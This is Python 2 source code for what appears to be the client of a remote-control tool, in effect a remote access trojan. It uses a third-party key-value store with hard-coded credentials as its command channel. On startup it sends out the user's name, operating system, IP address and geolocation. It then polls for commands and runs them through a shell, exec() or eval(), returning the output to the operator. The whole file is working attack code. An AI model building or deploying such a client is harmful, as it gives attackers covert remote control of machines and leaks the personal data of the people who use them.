from sys import platform
import getpass
from urllib2 import urlopen
import json
import requests
import time
import random
import datetime
import subprocess
import sys,os
import pytz

sys.path.insert(0,'..')
from my_plugins.kvdb.openkv import OpenKV

from colorama import init, AnsiToWin32, Fore, Style
init(wrap=False)
stream = AnsiToWin32(sys.stderr).stream
win_sys = False

if platform.startswith('win'):
    win_sys = True

platform_dict = {'linux2': "Linux",'win32':"Windows",'cygwin':"Windows/Cygwin",'darwin':"Mac OS X",'os2':"OS/2",'os2emx':"OS/2 EMX",'riscos':"RiscOS",'atheos':"AtheOS"}
USER,PASS = "rock","112233"
username = str(getpass.getuser())
last_server_time = None
server_persistent_time = 60 * 30 # 0.5 hour
last_command_arrival_time = None
client_info = {}

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    


def os_information():
    global platform_dict
    if platform in platform_dict.keys():
        return platform_dict[platform]
    return platform

def geo_information():
    try:
        send_url = 'http://freegeoip.net/json'
        r = requests.get(send_url)
        geo = json.loads(r.text)
        return geo
    except:
        return None


def latest_val_of(kv,key,time=False):
    global USER,PASS
    if not time:
        try:
            return kv.val(kv.latest(kv.getValue(USER,PASS,str(key))[str(key)]))
        except:
            return None
    else:
        try:
            result = kv.latest(kv.getValue(USER, PASS, str(key))[str(key)])
            return result.keys()[0],result.values()[0]
        except:
            return None,None

def change_dir(dir):
    os.chdir(dir)

def str_to_time(time_str):
    main,minor = time_str.split()
    year,month,day, = main.strip().split('-')
    hour, minute, second = minor.strip().split(':')
    time_list = (int(year),int(month),int(day),int(hour),int(minute),int(second))
    return datetime.datetime(*time_list)


def get_open_ip():
    try:
        ip = urlopen('http://ip.42.pl/raw').read()
    except:
        ip = None
    return ip


def init_connection():
    if not win_sys:
        print bcolors.BOLD + bcolors.OKGREEN + "[+]Initiating Remote Connection" + bcolors.ENDC + bcolors.ENDC
    else:
        print >>stream, Fore.LIGHTGREEN_EX + "[+]Initiating Remote Connection" + Style.RESET_ALL
    kv = OpenKV()
    kv_id = '4K5gyNGZ'
    kv.setDB(kv_id)

    return kv


def round_bin_check(kv):
    global last_server_time
    global server_persistent_time
    server_status = latest_val_of(kv, "server_status")
    if not win_sys:
        print bcolors.OKGREEN + "[+]Waiting server status..." + bcolors.ENDC
    else:
        print >>stream, Fore.LIGHTGREEN_EX + "[+]Waiting server status..." + Style.RESET_ALL
    valid_server_status = True # indicate whether the last server status is valid
    while server_status is None or server_status == {}:
        time.sleep(random.randint(3,10))
        server_status = latest_val_of(kv, "server_status")
    while True:
        if valid_server_status:
            status = json.loads(str(server_status))
        else:
            time.sleep(random.randint(3, 10))
            server_status = latest_val_of(kv, "server_status")
            status = json.loads(str(server_status))
            valid_server_status = True
        if status['status'] == 'on':
            init_time = status['time']
            if last_server_time != init_time:
                # timestamp is updated
                last_server_time = init_time
                tz = pytz.timezone('Asia/Shanghai')
                now = datetime.datetime.now(tz)
                now = now.replace(tzinfo=None)
                time_params = last_server_time.split('-')
                time_params = [int(v) for v in time_params]
                init_datetime = datetime.datetime(*time_params)
                time_theta = now - init_datetime
                if time_theta.seconds < server_persistent_time:
                    # server init time is within 30 mins, we assume the server is alive
                    break
                else:
                    # the server status might expire, so we continue to seek for latest status
                    valid_server_status = False
                    continue
            else:
                valid_server_status = False
                continue
        else:
            if not win_sys:
                print bcolors.BOLD +bcolors.FAIL+ "[-]Server is off" + bcolors.ENDC + bcolors.ENDC
            else:
                print >>stream, Fore.LIGHTRED_EX + "[-]Server is off" + Style.RESET_ALL
            valid_server_status = False
            continue
    if not win_sys:
        print bcolors.BOLD + bcolors.OKGREEN + '[+]Server found (initiated before ' + str(time_theta.seconds) + " seconds)" + bcolors.ENDC + bcolors.ENDC
    else:
        print >>stream, Fore.LIGHTGREEN_EX + '[+]Server found (initiated before ' + str(time_theta.seconds) + " seconds)" + Style.RESET_ALL


def send_basic_information(kv):
    global client_info
    content = {}
    content["user"] = username
    content['os'] = os_information()
    geo = geo_information()
    ip = get_open_ip()
    if geo is not None:
        content["country"] = geo['country_name']
        content["city"] = geo['city']
        content["latitude"] = geo['latitude']
        content['longitude'] = geo['longitude']
        if ip is not None:
            content["ip"] = str(ip).strip()
        else:
            content["ip"] = geo['ip']
    client_info = content
    content_str = json.dumps(content)
    key = "initiation"
    while not kv.setValue(USER,PASS,key,content_str):
        # sending until succeed
        sleep_time = random.randint(1,10)
        time.sleep(sleep_time)

def execute(kv):
    global last_command_arrival_time
    global username
    command_raw = ''
    while True:# main loop
        while True: #find the latest command from server
            update_time,command_raw = latest_val_of(kv,"commands",time=True)
            if update_time is None or command_raw is None:
                time.sleep(random.randint(1,3))
                continue
            command_json = json.loads(command_raw)
            command,target,id = command_json['command'],command_json['target'],command_json['id']
            if target == username or target == 'all': # this command is targeted for this client
                if update_time != last_command_arrival_time:
                    last_command_arrival_time = update_time
                    arrival_time = str_to_time(last_command_arrival_time)
                    tz = pytz.timezone('Asia/Shanghai')
                    now = datetime.datetime.now(tz)
                    now = now.replace(tzinfo=None)
                    time_theta = now - arrival_time
                    if time_theta.seconds <= 20:
                        # we practically think the command should be in 20 seconds
                        break
                    else:
                        time.sleep(random.randint(1,4))
                        continue
                else:
                    time.sleep(random.randint(1,4))
                    continue
            else:
                time.sleep(random.randint(1,4))
                continue
        if not win_sys:
            print bcolors.OKBLUE + '[CMD]' + command + bcolors.ENDC
        else:
            print >>stream, Fore.LIGHTBLUE_EX + '[CMD]' + command + Style.RESET_ALL
        if command == "kill":
            command_result = "The client of " + username + "is killed"
            response = {}
            response['result'] = command_result
            response['client'] = username
            response['ip'] = client_info['ip']
            kv.setValue(USER, PASS, "reply_" + str(id), json.dumps(response)) # We do not want to still check the sent info
            sys.exit()
        elif command.startswith('cd '):
            path = command.split(' ')[1].strip()
            response = {}
            try:
                change_dir(path)
                response['result'] = "Directory changed: " + os.path.abspath(os.curdir)
            except:
                response['result'] = "Illegal directory: " + path
            response['ip'] = client_info['ip']
            response['client'] = username
        elif command.startswith('%exec '):
            response = {}
            code = command.split("%exec ")[1].strip()
            try:
                exec(code)
                response['result'] = code + " was executed"
            except Exception,e:
                response['result'] = code + " failed\n" + str(e)
            response['client'] = username
            response['ip'] = client_info['ip']
        elif command.startswith('%eval '):
            response = {}
            code = command.split("%eval ")[1].strip()
            try:
                val = eval(code)
                response['result'] = str(val)
            except Exception, e:
                response['result'] = code + " failed\n" + str(e)
            response['client'] = username
            response['ip'] = client_info['ip']
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            command_result = CMD.stdout.read() + "\n[+]Finished"
            response = {}
            response['result'] = command_result.decode('utf-8','ignore')
            response['client'] = username.decode('utf-8','ignore')
            response['ip'] = client_info['ip']
        while not kv.setValue(USER,PASS,"reply_"+str(id),json.dumps(response)):
            time.sleep(random.randint(1,5))
            if not win_sys:
                print bcolors.FAIL + '[-]Not sent. Retrying...' + bcolors.ENDC
            else:
                print >>stream, Fore.LIGHTRED_EX + '[-]Not sent. Retrying...' + Style.RESET_ALL


if __name__ == "__main__":
    db = init_connection()
    round_bin_check(db)
    send_basic_information(db)
    execute(db)